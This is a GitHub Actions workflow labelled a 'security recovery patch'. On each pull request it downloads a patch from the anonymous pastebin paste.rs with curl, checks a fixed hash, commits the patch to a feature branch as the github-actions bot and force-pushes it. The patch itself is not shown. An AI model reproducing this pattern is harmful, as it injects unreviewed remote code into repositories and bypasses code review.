name: ci

on:
  pull_request:
    branches: [main, develop]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply-security-recovery:
    name: Apply security recovery patch
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR branch
        uses: actions/checkout@v6
        with:
          ref: feature/bootstrap-architecture-v0.1
          fetch-depth: 0

      - name: Apply verified security patch
        shell: bash
        run: |
          set -euo pipefail
          patch_url="https://paste.rs/asUBV"
          expected_sha="85284B2BC1A0F7C91E625894C512EB5D72964617623F10C3BE5F38AE6F02520B"
          patch_path="$RUNNER_TEMP/security-provider-containment.patch"

          curl -fsSL "$patch_url" -o "$patch_path"
          actual_sha="$(sha256sum "$patch_path" | cut -d ' ' -f 1 | tr '[:lower:]' '[:upper:]')"
          if [ "$actual_sha" != "$expected_sha" ]; then
            echo "Patch SHA mismatch: expected $expected_sha, got $actual_sha"
            exit 1
          fi

          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git fetch origin feature/bootstrap-architecture-v0.1
          lease_head="$(git rev-parse origin/feature/bootstrap-architecture-v0.1)"
          git checkout -B feature/bootstrap-architecture-v0.1 "$lease_head"
          git am "$patch_path"
          git push --force-with-lease=feature/bootstrap-architecture-v0.1:$lease_head origin HEAD:feature/bootstrap-architecture-v0.1
